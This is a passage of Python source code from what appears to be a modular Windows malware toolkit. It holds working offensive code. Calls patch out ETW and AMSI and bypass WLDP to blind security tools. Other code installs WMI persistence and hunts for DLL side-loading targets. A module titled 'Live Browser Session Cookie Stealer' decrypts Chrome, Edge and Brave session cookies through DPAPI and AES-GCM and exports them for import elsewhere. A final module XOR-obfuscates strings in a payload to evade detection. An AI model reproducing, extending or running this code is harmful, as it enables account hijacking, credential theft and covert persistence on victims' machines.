    results["etw"] = patch_etw()
    results["amsi"] = patch_amsi()
    results["wldp"] = wldp_bypass()
    return results

def install_all_persistence(script_path):
    results = {}
    results["wmi"] = install_wmi_persistence(script_path)
    results["dll_sideload"] = len(find_dll_sideload_targets()) > 0
    return results

# ──────────────────────────────────────────────
# MODULE 18: Live Browser Session Cookie Stealer
# ──────────────────────────────────────────────

def steal_live_cookies():
    """Read decrypted session cookies from Chrome/Edge/Brave running process memory"""
    cookies = []
    browsers = [
        ("Chrome", "Google\\Chrome"),
        ("Edge", "Microsoft\\Edge"),
        ("Brave", "BraveSoftware\\Brave-Browser"),
    ]

    for browser_name, browser_path in browsers:
        # Find browser PID
        target_pid = None
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                pname = proc.info['name'].lower()
                if browser_name.lower() in pname or 'chrome' in pname and browser_name == 'Chrome':
                    target_pid = proc.info['pid']
                    break
            except: pass

        if not target_pid:
            continue

        # Try to read from the browser's Local Storage / cookie file directly
        # and also attempt memory reading
        user_data = os.path.join(os.environ['LOCALAPPDATA'], browser_path, 'User Data')
        if not os.path.exists(user_data):
            continue

        # Discover profiles
        profiles = ["Default"]
        try:
            for item in os.listdir(user_data):
                if item.startswith("Profile ") and os.path.isdir(os.path.join(user_data, item)):
                    profiles.append(item)
        except: pass

        for profile in profiles:
            cookie_db = os.path.join(user_data, profile, 'Network', 'Cookies')
            if not os.path.exists(cookie_db):
                continue

            try:
                # Copy cookies DB to temp to avoid locks
                temp_c = os.path.join(os.environ['TEMP'], f"{browser_name}_{profile}_live_cookies")
                shutil.copy2(cookie_db, temp_c)

                # Get master key
                local_state_path = os.path.join(user_data, "Local State")
                if not os.path.exists(local_state_path):
                    os.remove(temp_c)
                    continue

                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = encrypted_key[5:]  # remove 'DPAPI' prefix

                # Decrypt with DPAPI
                class DATA_BLOB(ctypes.Structure):
                    _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.c_void_p)]

                buf_in = DATA_BLOB(len(master_key), ctypes.cast(ctypes.create_string_buffer(master_key), ctypes.c_void_p))
                buf_out = DATA_BLOB()
                if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(buf_in), None, None, None, None, 0, ctypes.byref(buf_out)):
                    master_key_decrypted = ctypes.string_at(buf_out.pbData, buf_out.cbData)
                else:
                    os.remove(temp_c)
                    continue

                import sqlite3
                from Crypto.Cipher import AES

                conn = sqlite3.connect(temp_c)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value, path, is_secure, is_httponly FROM cookies")

                for host, name, enc_val, path, is_secure, is_httponly in cursor.fetchall():
                    if not enc_val:
                        continue
                    try:
                        # Chrome cookies: v10/v11 prefix + AES-GCM
                        iv = enc_val[3:15]
                        payload = enc_val[15:]
                        cipher = AES.new(master_key_decrypted, AES.MODE_GCM, iv)
                        decrypted = cipher.decrypt(payload)[:-16].decode(errors='replace')

                        # Netscape cookie format for easy import
                        secure_flag = "TRUE" if is_secure else "FALSE"
                        http_only = "TRUE" if is_httponly else "FALSE"
                        cookies.append(f"{host}\t{secure_flag}\t{path}\t{http_only}\t2597573456\t{name}\t{decrypted}")
                    except:
                        pass

                conn.close()
                os.remove(temp_c)
            except:
                try: os.remove(temp_c)
                except: pass

    return cookies

# ──────────────────────────────────────────────
# MODULE 19: String Encryption Utility
# ──────────────────────────────────────────────

def xor_encrypt(data, key=None):
    if key is None:
        key = os.urandom(32)
    if isinstance(data, str):
        data = data.encode()
    if isinstance(key, str):
        key = key.encode()
    encrypted = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
    return encrypted, key

def xor_decrypt(encrypted, key):
    if isinstance(key, str):
        key = key.encode()
    return bytes(encrypted[i] ^ key[i % len(key)] for i in range(len(encrypted)))

def obfuscate_strings(payload_path, output_path=None):
    """Read a Python file and produce an obfuscated version with XOR-encrypted strings"""
    if output_path is None:
        output_path = payload_path.replace('.py', '_obf.py')

    with open(payload_path, 'r', encoding='utf-8') as f:
        source = f.read()

    # Find all string literals and encrypt them
    strings_to_encrypt = re.findall(r'["\'](https?://[^"\'\s]+|\\\\[^"\'\s]+|[A-Za-z0-9_]{20,})["\']', source)

    obf_key = base64.b64encode(os.urandom(16)).decode()
    obfuscated = source

    for s in set(strings_to_encrypt):
        if len(s) < 8:
            continue
        enc = base64.b64encode(xor_encrypt(s.encode(), obf_key)[0]).decode()
        placeholder = f'__decrypt("{enc}")'
        obfuscated = obfuscated.replace(f'"{s}"', placeholder)
        obfuscated = obfuscated.replace(f"'{s}'", placeholder)

    # Add the decrypt function at the top
    header = f'''
import base64
_OBF_KEY = "{obf_key}"
def __decrypt(s):
    import base64
    d = base64.b64decode(s)
    return bytes(d[i] ^ ord(_OBF_KEY[i % len(_OBF_KEY)]) for i in range(len(d))).decode()
'''

    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(header + '\n' + obfuscated)

    return output_path

if __name__ == "__main__":
    print("[MODULES] Testing module load...")
    print(json.dumps(apply_defense_patches(), indent=2))
